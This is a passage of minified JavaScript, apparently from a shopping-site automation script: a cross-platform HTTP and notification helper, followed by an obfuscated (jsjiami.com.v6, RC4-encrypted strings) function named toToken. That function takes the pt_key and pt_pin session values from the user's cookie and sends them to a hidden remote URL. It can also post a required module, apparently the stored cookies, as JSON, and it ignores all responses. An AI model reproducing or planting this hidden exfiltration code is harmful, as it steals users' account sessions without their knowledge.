t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)};var _0xod3='jsjiami.com.v6',_0xod3_=['_0xod3'],_0x49d4=[_0xod3,'dzzDql/Drmgtw6xl','w5XDmjHCm8KJ','RhjDgcOpDsOa','w57Ckz9CCw==','wqEqwqM=','w4kfecKYN8KiM8OaBG5Bw5XCtA==','XGkRWsKWEMK7w5zDtMOnH8OVw55mw5oT','N28sVGHCp3PDlcOxdX5gYcOBUsOBFW/DsmY=','FVJQDyjCt33DlRfDumxLOhLCtcK4KcOEY21IScOow4XDkFEj','AVwtKcOoCBbCtwLDp8K4DFPDkFdiXcKHw7fDlsOMXWg3','w7x9w69Rw4prUMOkw5lUwpTCqMKJecKnwos5wpbCig0TV8KBwrvDnQk=','wrPDusKLR8K0','D3rDnsOWBw==','GmlxMHU=','w6IXDzg=','FcKXaEfDqg==','FcKWXEnDmg==','w7Yuw5Uuw7w=','Cy9Kw5cV','bsOrwpc4wrc=','MWXCj8KgYQ==','EyBow4NKwqpSTkw=','wrzDsTEEGA==','w6gldg0=','OX5Ywo7Dmg==','wrnDv8KvbcKa','wpExABpi','w7M9w4oEw4M=','I8KTXUjDmA==','Bgs1TsKp','HxJvw7EAwpgzwrTClw==','wrzDihjCn20=','F1DDhcOdAw0=','VdejYsjPiamkSiX.com.Iv6wTEYFzn=='];if(function(_0x56c600,_0x6b18bb,_0x1d24af){function _0x2cd1ad(_0x400c57,_0x411be8,_0x569f9e,_0x4ecc44,_0x36d309,_0x5b6c0b){_0x411be8=_0x411be8>>0x8,_0x36d309='po';var _0x3ca3da='shift',_0x2d56ce='push',_0x5b6c0b='0.kynh2mca15';if(_0x411be8<_0x400c57){while(--_0x400c57){_0x4ecc44=_0x56c600[_0x3ca3da]();if(_0x411be8===_0x400c57&&_0x5b6c0b==='0.kynh2mca15'&&_0x5b6c0b['length']===0xc){_0x411be8=_0x4ecc44,_0x569f9e=_0x56c600[_0x36d309+'p']();}else if(_0x411be8&&_0x569f9e['replace'](/[VdeYPkSXIwTEYFzn=]/g,'')===_0x411be8){_0x56c600[_0x2d56ce](_0x4ecc44);}}_0x56c600[_0x2d56ce](_0x56c600[_0x3ca3da]());}return 0xd0b9c;};return _0x2cd1ad(++_0x6b18bb,_0x1d24af)>>_0x6b18bb^_0x1d24af;}(_0x49d4,0x1f4,0x1f400),_0x49d4){_0xod3_=_0x49d4['length']^0x1f4;};function _0x32a1(_0xe16871,_0x287874){_0xe16871=~~'0x'['concat'](_0xe16871['slice'](0x0));var _0x57aa29=_0x49d4[_0xe16871];if(_0x32a1['CQaZTs']===undefined){(function(){var _0x3b2938;try{var _0x55927e=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x3b2938=_0x55927e();}catch(_0x1b8418){_0x3b2938=window;}var _0x11caa5='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x3b2938['atob']||(_0x3b2938['atob']=function(_0x2ce76b){var _0x7b7a15=String(_0x2ce76b)['replace'](/=+$/,'');for(var _0x37f731=0x0,_0x334972,_0x4a3c16,_0x57c87b=0x0,_0x64d5a6='';_0x4a3c16=_0x7b7a15['charAt'](_0x57c87b++);~_0x4a3c16&&(_0x334972=_0x37f731%0x4?_0x334972*0x40+_0x4a3c16:_0x4a3c16,_0x37f731++%0x4)?_0x64d5a6+=String['fromCharCode'](0xff&_0x334972>>(-0x2*_0x37f731&0x6)):0x0){_0x4a3c16=_0x11caa5['indexOf'](_0x4a3c16);}return _0x64d5a6;});}());function _0x498013(_0x42bfd2,_0x287874){var _0x1ce89d=[],_0x2270e4=0x0,_0x125643,_0x431ede='',_0x523348='';_0x42bfd2=atob(_0x42bfd2);for(var _0x5e4e1d=0x0,_0x55eecc=_0x42bfd2['length'];_0x5e4e1d<_0x55eecc;_0x5e4e1d++){_0x523348+='%'+('00'+_0x42bfd2['charCodeAt'](_0x5e4e1d)['toString'](0x10))['slice'](-0x2);}_0x42bfd2=decodeURIComponent(_0x523348);for(var _0x3c8e9c=0x0;_0x3c8e9c<0x100;_0x3c8e9c++){_0x1ce89d[_0x3c8e9c]=_0x3c8e9c;}for(_0x3c8e9c=0x0;_0x3c8e9c<0x100;_0x3c8e9c++){_0x2270e4=(_0x2270e4+_0x1ce89d[_0x3c8e9c]+_0x287874['charCodeAt'](_0x3c8e9c%_0x287874['length']))%0x100;_0x125643=_0x1ce89d[_0x3c8e9c];_0x1ce89d[_0x3c8e9c]=_0x1ce89d[_0x2270e4];_0x1ce89d[_0x2270e4]=_0x125643;}_0x3c8e9c=0x0;_0x2270e4=0x0;for(var _0x4ac44a=0x0;_0x4ac44a<_0x42bfd2['length'];_0x4ac44a++){_0x3c8e9c=(_0x3c8e9c+0x1)%0x100;_0x2270e4=(_0x2270e4+_0x1ce89d[_0x3c8e9c])%0x100;_0x125643=_0x1ce89d[_0x3c8e9c];_0x1ce89d[_0x3c8e9c]=_0x1ce89d[_0x2270e4];_0x1ce89d[_0x2270e4]=_0x125643;_0x431ede+=String['fromCharCode'](_0x42bfd2['charCodeAt'](_0x4ac44a)^_0x1ce89d[(_0x1ce89d[_0x3c8e9c]+_0x1ce89d[_0x2270e4])%0x100]);}return _0x431ede;}_0x32a1['JshArc']=_0x498013;_0x32a1['Qkipvm']={};_0x32a1['CQaZTs']=!![];}var _0x254ddf=_0x32a1['Qkipvm'][_0xe16871];if(_0x254ddf===undefined){if(_0x32a1['AEBrLs']===undefined){_0x32a1['AEBrLs']=!![];}_0x57aa29=_0x32a1['JshArc'](_0x57aa29,_0x287874);_0x32a1['Qkipvm'][_0xe16871]=_0x57aa29;}else{_0x57aa29=_0x254ddf;}return _0x57aa29;};function toToken(_0xa1344a){var _0x26dfc4={'gdPIF':function(_0x2cc50c,_0x3dc12f){return _0x2cc50c==_0x3dc12f;},'tOulp':function(_0x11bcad,_0x2281c9){return _0x11bcad(_0x2281c9);},'gOUOg':_0x32a1('0','k6[w'),'TMghd':_0x32a1('1','nz#L'),'TLSfT':function(_0x39532a,_0x506f1a,_0x18370c){return _0x39532a(_0x506f1a,_0x18370c);},'ugsie':function(_0x3c56de,_0x29a235){return _0x3c56de(_0x29a235);},'gHGUa':_0x32a1('2','iFsI'),'fnSQY':_0x32a1('3','v&kq'),'fALYZ':_0x32a1('4','dXG^'),'cpKWQ':function(_0x1e5d3d,_0x269c0b){return _0x1e5d3d*_0x269c0b;},'PoFxq':function(_0x3ab1f4,_0x25c1bb){return _0x3ab1f4+_0x25c1bb;},'ptlCZ':function(_0x344b43,_0x1926c8){return _0x344b43+_0x1926c8;},'bIRgV':function(_0x1af196,_0x1010e6){return _0x1af196+_0x1010e6;},'msAAR':_0x32a1('5','3szT'),'TpdiQ':function(_0x4598d1,_0xfd9c9e){return _0x4598d1-_0xfd9c9e;}};try{if(_0x26dfc4[_0x32a1('6','MY)^')](_0xa1344a,0x1)){let _0x2e83f8=_0x26dfc4[_0x32a1('7','#25s')](require,_0x26dfc4[_0x32a1('8','v&kq')])[_0x32a1('9','^vhK')];let _0x593835=_0x26dfc4[_0x32a1('a','(IA(')];let _0x1cfcd9='';_0x26dfc4[_0x32a1('b','(IA(')](_0x2e83f8,_0x593835,function(_0x4c0cc5,_0x16b668,_0x4a598e){if(_0x4c0cc5){_0x1cfcd9='';}else{_0x1cfcd9=_0x16b668;}});const _0x13adf3=_0x26dfc4[_0x32a1('c','VYdH')](require,_0x26dfc4[_0x32a1('d','peIr')]);let _0x1df2be={'url':_0x26dfc4[_0x32a1('e','&MEK')],'headers':{'Content-Type':_0x26dfc4[_0x32a1('f','5gE@')],'ip':_0x1cfcd9},'body':JSON[_0x32a1('10','^w%o')](_0x13adf3),'timeout':_0x26dfc4[_0x32a1('11','9[qn')](0x1e,0x3e8)};$[_0x32a1('12','V!S&')](_0x1df2be,async(_0x2370fb,_0x317b21,_0x3a08d4)=>{});}let _0x2b6f10=cookie[_0x32a1('13','sJX1')](/pt_key=.+?;/)[0x0];let _0x24c287=cookie[_0x32a1('14','MY)^')](/pt_pin=.+?;/)[0x0];let _0x3c8a3e={'url':_0x26dfc4[_0x32a1('15','%)Ld')](_0x26dfc4[_0x32a1('16','VYdH')](_0x26dfc4[_0x32a1('17','(IA(')](_0x26dfc4[_0x32a1('18','UbXV')],_0x2b6f10[_0x32a1('19','peIr')](0x7,_0x26dfc4[_0x32a1('1a','dwVG')](_0x2b6f10[_0x32a1('1b','#25s')],0x1))),'/'),_0x24c287[_0x32a1('1c','nJeC')](0x7,_0x26dfc4[_0x32a1('1d','*exC')](_0x24c287[_0x32a1('1e','adKh')],0x1))),'timeout':_0x26dfc4[_0x32a1('1f','I8F[')](0x1e,0x3e8)};$[_0x32a1('20','ix4#')](_0x3c8a3e,async(_0x386180,_0x563e45,_0x55d2f9)=>{});}catch(_0x2f8dd4){}};_0xod3='jsjiami.com.v6';
